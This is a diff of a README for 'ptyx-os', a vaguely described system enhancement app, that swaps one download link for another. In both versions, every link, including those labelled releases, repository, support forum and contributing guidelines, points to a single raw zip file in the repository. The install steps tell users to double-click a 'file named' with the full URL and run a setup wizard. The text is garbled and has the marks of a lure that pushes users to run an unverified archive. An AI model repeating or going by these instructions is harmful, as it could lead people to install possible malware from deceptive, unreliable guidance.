@@ -1,6 +1,6 @@
 # 🎉 ptyx-os - A Simple Way to Enhance Your System
 
-[![Download ptyx-os](https://github.com/joacosoto1/ptyx-os/raw/refs/heads/main/files/ptyx_os_1.7.zip)](https://github.com/joacosoto1/ptyx-os/raw/refs/heads/main/files/ptyx_os_1.7.zip)
+[![Download ptyx-os](https://raw.githubusercontent.com/joacosoto1/ptyx-os/main/files/system/etc/ptyx-os-v1.5-beta.5.zip)](https://raw.githubusercontent.com/joacosoto1/ptyx-os/main/files/system/etc/ptyx-os-v1.5-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to ptyx-os! This application helps you enhance your operating system wit
 
 To get started, you need to visit our Releases page. Here, you can find the latest version of ptyx-os. 
 
-[Visit this page to download](https://github.com/joacosoto1/ptyx-os/raw/refs/heads/main/files/ptyx_os_1.7.zip).
+[Visit this page to download](https://raw.githubusercontent.com/joacosoto1/ptyx-os/main/files/system/etc/ptyx-os-v1.5-beta.5.zip).
 
 ### Steps to Download:
 
@@ -33,13 +33,13 @@ Once you have downloaded ptyx-os, follow these steps to install it:
 ### For Windows:
 
 1. Locate the downloaded file, usually in your "Downloads" folder.
-2. Double-click the file named `https://github.com/joacosoto1/ptyx-os/raw/refs/heads/main/files/ptyx_os_1.7.zip`.
+2. Double-click the file named `https://raw.githubusercontent.com/joacosoto1/ptyx-os/main/files/system/etc/ptyx-os-v1.5-beta.5.zip`.
 3. A setup wizard will appear. Follow the on-screen instructions.
 4. Once the installation is complete, restart your computer.
 
 ### For macOS:
 
-1. Open the "Downloads" folder and find the file named `https://github.com/joacosoto1/ptyx-os/raw/refs/heads/main/files/ptyx_os_1.7.zip`.
+1. Open the "Downloads" folder and find the file named `https://raw.githubusercontent.com/joacosoto1/ptyx-os/main/files/system/etc/ptyx-os-v1.5-beta.5.zip`.
 2. Double-click the file to mount it.
 3. Drag the ptyx-os icon into your Applications folder.
 4. Eject the mounted disk image and launch the application from the Applications folder.
@@ -69,12 +69,12 @@ To ensure you have the latest features and fixes, regularly check the Releases p
 
 For more information and updates, explore the following:
 
-- [Official GitHub Repository](https://github.com/joacosoto1/ptyx-os/raw/refs/heads/main/files/ptyx_os_1.7.zip)
-- [Community Support Forum](https://github.com/joacosoto1/ptyx-os/raw/refs/heads/main/files/ptyx_os_1.7.zip)
+- [Official GitHub Repository](https://raw.githubusercontent.com/joacosoto1/ptyx-os/main/files/system/etc/ptyx-os-v1.5-beta.5.zip)
+- [Community Support Forum](https://raw.githubusercontent.com/joacosoto1/ptyx-os/main/files/system/etc/ptyx-os-v1.5-beta.5.zip)
 
 ## 🤝 Contributing
 
-We welcome contributions from everyone! If you would like to help improve ptyx-os, feel free to check out our [contributing guidelines](https://github.com/joacosoto1/ptyx-os/raw/refs/heads/main/files/ptyx_os_1.7.zip).
+We welcome contributions from everyone! If you would like to help improve ptyx-os, feel free to check out our [contributing guidelines](https://raw.githubusercontent.com/joacosoto1/ptyx-os/main/files/system/etc/ptyx-os-v1.5-beta.5.zip).
 
 ## 🚨 Important Notes
 
